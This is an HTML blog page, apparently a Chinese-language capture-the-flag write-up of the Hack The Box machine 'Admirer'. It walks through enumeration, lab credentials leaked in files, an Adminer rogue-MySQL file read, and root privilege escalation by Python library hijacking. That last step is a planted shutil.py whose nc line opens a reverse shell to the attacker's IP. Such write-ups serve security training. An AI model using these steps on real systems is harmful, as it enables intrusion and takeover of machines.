@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Admirer | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scan #### ports 21端口不允许匿名登录 22端口不允许直接连接 #### dirsearch  在robots.txt中有一个额外的目录admin-dir 虽然我们没有权限访问，但是我们可以尝试扫二级目录 会扫到一个admin-dir&#x2F;credentials.txt的二级目录里面有password  [Internal mail account] w.cooper@adm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Admirer">
+<meta property="og:url" content="http://example.com/2022/08/30/Admirer/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scan #### ports 21端口不允许匿名登录 22端口不允许直接连接 #### dirsearch  在robots.txt中有一个额外的目录admin-dir 虽然我们没有权限访问，但是我们可以尝试扫二级目录 会扫到一个admin-dir&#x2F;credentials.txt的二级目录里面有password  [Internal mail account] w.cooper@adm">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/08/30/Admirer/nmap.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Admirer/dir.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Admirer/password.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Admirer/dbpass.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Admirer/password2">
+<meta property="og:image" content="http://example.com/2022/08/30/Admirer/web1.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Admirer/password3.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Admirer/web.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Admirer/user.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Admirer/sudo.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Admirer/pypath.png">
+<meta property="article:published_time" content="2022-08-30T08:43:43.000Z">
+<meta property="article:modified_time" content="2022-08-31T01:35:49.611Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/30/Admirer/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Admirer" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/30/Admirer/" class="article-date">
+  <time class="dt-published" datetime="2022-08-30T08:43:43.000Z" itemprop="datePublished">2022-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Admirer
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/30/Admirer/nmap.png">
+#### ports
+21端口不允许匿名登录
+22端口不允许直接连接
+#### dirsearch
+<img src="/2022/08/30/Admirer/dir.png">
+在robots.txt中有一个额外的目录admin-dir
+虽然我们没有权限访问，但是我们可以尝试扫二级目录
+会扫到一个admin-dir/credentials.txt的二级目录里面有password
+<img src="/2022/08/30/Admirer/password.png">
+[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+<p>[FTP account]<br>ftpuser<br>%n?4Wz}R$tTF7</p>
+<p>[Wordpress account]<br>admin<br>w0rdpr3ss01!</p>
+<p>目前我们只找到了一个ftp，可以尝试先从ftp下手<br>ftp里面有一个dump.sql和一个html的备份，下载下来看看<br>dump.sql看起来像是插入图片和描述的sql<br>在html.tar.gz里面的index.php中我们可以找到一个数据库的用户名和密码<br><img src="/2022/08/30/Admirer/dbpass.png"><br><code>$servername = &quot;localhost&quot; $username = &quot;waldo&quot; $password = &quot;]F7jLHw:*G&gt;UPrTo&#125;~A&quot;d6b&quot;</code><br>在robots.txt中找到了另一个隐藏目录&#x2F;w4ld0s_s3cr3t_d1r<br>可以尝试登录，在web上登不上去<br>去源码里找这个界面<br>有一个新的密码<br><img src="/2022/08/30/Admirer/password2"></p>
+<p>[Bank Account]<br>waldo.11<br>Ezy]m27}OREc$</p>
+<p>去访问admin_tasks.php可以看到一些功能<br><img src="/2022/08/30/Admirer/web1.png"><br>在db_admin.php里能找到另一套数据库密码<br><code>$servername = &quot;localhost&quot;; $username = &quot;waldo&quot;; $password = &quot;Wh3r3_1s_w4ld0?&quot;;</code><br>再用dirsearch扫一遍目录<br>可以扫到adminer.php<br>但是所有的凭证都无法进行登录<br>在(Serious Vulnerability Discovered in Adminer database Administration Tool)[<a target="_blank" rel="noopener" href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool]%E6%8F%90%E5%88%B0%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%9C%AC%E5%9C%B0mysql%E7%94%A8%E6%88%B7%E5%8F%AF%E4%BB%A5%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%88%B0%E8%BF%99%E4%B8%AA%E4%B8%8A%E9%9D%A2">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool]提到创建一个本地mysql用户可以远程连接到这个上面</a><br>首先要配置本地数据库<br><code>service mysql start</code><br><code>CREATE DATABASE admirer; # Create the database CREATE USER ‘adminer’@&#39;%&#39; IDENTIFIED BY ‘password’; # Create the user GRANT ALL PRIVILEGES ON *. *TO&#39;adminer&#39;@&#39;%&#39;; # Grants the created user full permissions FLUSH PRIVILEGES # Refreshes privileges create table test(data VARCHAR(255)); # Create a table in the database</code><br>之后修改&#x2F;etc&#x2F;mysql&#x2F;mariadb.conf.d&#x2F;50-server.cnf的bind-address为0.0.0.0<br>然后登录admirer<br>可以成功进行登录<br>在登录后使用下面一条语句把数据导入test表中<br><code>load data local infile&#39;../index.php&#39; into table test fields terminated by &quot;/n&quot;</code><br>在导入成功后可以找到mysql的密码<br><img src="/2022/08/30/Admirer/password3.png"><br><code>$servername = &quot;localhost&quot;; $username = &quot;waldo&quot;; $password = &quot;&amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;&quot;; $dbname = &quot;admirerdb&quot;;</code><br>可以成功进行登录<br><img src="/2022/08/30/Admirer/web.png"><br>用新拿到的密码尝试ssh进行登录<br>可以登录进去<br><img src="/2022/08/30/Admirer/user.png"></p>
+<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><p>先sudo<br><img src="/2022/08/30/Admirer/sudo.png"><br>这个脚本的所有者是SETENV<br>在备份网站的时候，该脚本调用了backup.py<br>说明backup.py是以root权限运行的</p>
+<h4 id="python库劫持-https-rastating-github-io-privilege-escalation-via-python-library-hijacking"><a href="#python库劫持-https-rastating-github-io-privilege-escalation-via-python-library-hijacking" class="headerlink" title="(python库劫持)[https://rastating.github.io/privilege-escalation-via-python-library-hijacking/]"></a>(python库劫持)[<a target="_blank" rel="noopener" href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/]">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/]</a></h4><p>该备份脚本用的是python3则可以键入<br><code>python3 -c &quot;import sys; print(&#39;\n&#39;.join(sys.path))&quot;</code><br>结果会出现一个空行<br>该行会在运行时脚本所在的当前目录填进去<br>如果我们设置一个$PYTHONPATH<br>则运行上面一条命令时会把$PYTHONPATH先填进去<br><img src="/2022/08/30/Admirer/pypath.png"><br>这说明python会先尝试寻找脚本所在目录然后是自己定义的目录然后尝试去导入shutil模块<br>找一个可写的目录<br><code>find / -type d -writable 2&gt;/dev/null | grep -v -e &#39;^/proc&#39; -e &#39;/run&#39;</code><br>重写一个shutil.py<br>    import os<br>    def make_archive(a, b, c):<br>        os.system(“nc 10.10.14.4 1234 -e’&#x2F;bin&#x2F;sh’”) </p>
+<p>将脚本传到目标机的&#x2F;var&#x2F;tmp中<br><code>sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6</code>得到反弹的shell</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/30/Admirer/" data-id="cl7irmudb0000d2cp6aln0d9n" data-title="Admirer" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/08/30/forest/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          forest
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/08/30/Networked/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Networked</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/09/07/nineveh/">nineveh</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/haircut/">haircut</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/cronos/">cronos</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/bastard/">bastard</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/popcorn/">popcorn</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
